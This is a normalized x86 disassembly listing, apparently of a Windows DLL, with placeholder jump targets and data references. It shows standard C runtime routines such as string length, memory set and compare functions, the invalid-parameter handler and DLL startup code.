test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10020186
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10022f32
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10027744
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_1000228a
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_10023a01
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_1002016b
push sub_1004b58e
call sub_10024d30
pop ecx
sub_100201fc
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_100200e0
mov esi eax
inc esi
push esi
call sub_10022f32
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_1002776c
add esp 0xc
jmp r-xdata
sub_1002026c
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_100200e0
mov edi eax
inc edi
push edi
call sub_10022f32
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_1002776c
add esp 0xc
jmp r-xdata
sub_100202ec
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_100201fc
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10020332
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100202c9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10020353
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100202c9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1002038a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002037a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100203ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_100232d0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_100203cb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10027850
add esp 0xc
call sub_10026065
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
mov eax esi
jmp r-xdata
sub_10020428
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10020451
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_100209e0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_10027bb5
pop ecx
sub_10020579
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_10027c38
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_10027bb5
pop ecx
pop ebp
jmp sub_10020451
pop ebp
jmp eax
sub_100205af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_10028920
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1002803b
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10027cb3
push 0x214
push 0x1
call sub_10026cea
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_100288d4
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1002879d
mov [ rw-data ] eax
call sub_100281c8
test eax eax
jge r-xdata
call sub_10028950
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_10027fcd
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_100239a4
call sub_100286e2
test eax eax
jl r-xdata
call sub_10027ce7
jmp r-xdata
push esi
call sub_100207fd
pop ecx
jmp r-xdata
push edi
push esi
call sub_10027d24
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1002841c
call sub_10027ce7
call sub_10028950
jmp r-xdata
call sub_1002841c
jmp r-xdata
call sub_1002846a
test eax eax
jl r-xdata
push 0x0
call sub_100237c7
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_100206e4
push 0xc
push r--data
call sub_10028b48
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001000
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_100205af
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_100205af
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001000
push edi
push 0x0
push ebx
call sub_100205af
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10028b8d
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_100206e4
pop ecx
pop ebp
retn 0xc
call sub_10028d3c
sub_100207fd
push 0xc
push r--data
call sub_10028b48
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10028b8d
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10028f81
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_10026065
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10026023
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10020853
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_10028fb1
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_1002088b
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002a8b3
add esp 0x14
pop ebp
retn
sub_100208d0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_10020980
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_100209e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1002a992
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10020a5a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_1002205a ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
